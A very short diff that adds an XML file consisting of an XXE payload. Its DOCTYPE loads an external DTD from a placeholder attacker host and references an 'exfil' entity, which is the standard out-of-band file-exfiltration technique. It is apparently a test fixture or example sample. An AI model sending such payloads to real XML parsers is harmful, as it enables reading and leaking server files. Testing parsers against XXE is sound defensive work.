@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY % ext SYSTEM "http://ATTACKER-HOST/evil.dtd"> %ext;]>
+<root>&exfil;</root>
